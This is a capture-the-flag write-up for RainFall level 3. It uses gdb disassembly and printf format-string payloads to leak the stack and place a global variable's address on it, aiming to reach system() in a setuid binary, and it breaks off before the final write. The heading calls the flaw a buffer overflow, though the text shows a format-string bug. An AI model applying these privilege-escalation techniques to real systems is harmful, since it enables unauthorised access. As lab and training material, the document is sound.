# Level 3

## Vulnerability

Buffer Overflow Exploit

## Context
```
level3@RainFall:~$ ls -l
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
level3@RainFall:~$ ./level3
hello
hello
```
We have a binary that prints input from the stdin. 

## Solution
Let's take a look at the binary in gdb. 
```
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.
```
We can see here that ```level3``` makes a call to ```main()```, which makes a call to a function ```v()```. <br/>
Let's take a deeper look a ```v()```.<br/><br/>
We can see two function calls in ```v()```. <br/>
One is to ```fgets()```, which is protected against buffer overflow attacks. <br/>
The other is to ```printf()```, which is vulnerable to string format exploits. 
```
(gdb) disas v
[...]
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
```
We also find a global variable ```m``` at address 0x804988c.
```
(gdb) break v
(gdb) run
(gdb) info variables
0x0804988c  m
```
Back in ```v()```, we see a comparison of variable ```m``` to the value 64 (or $0x40 in hexadecimal).<br/>
If the comparison is not equal (```jne```), then the program quits.<br/>
If the comparison is true, the program makes a call to ```system()``` and launches a new shell. 
```
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   [...]
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
```
We know that a ```printf()``` string with spurious % specifiers can be used to read whatever is on the stack. 
Let's try it out. We'll use the modifier ```%x```, which will print out addresses on the stack in hexadecimal.
```
level3@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x"' | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```
Interesting... We can see our buffer "AAAA" in the 4th position on the stack as ```41414141```.
This means that we can leverage ```printf``` to write our variable ```m```'s address, directly in the stack!
So let's replace our buffer "AAAA" with the address of the variable ```m``` (in little endian).
```
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
�200 b7fd1ac0 b7ff37d0 804988c
```





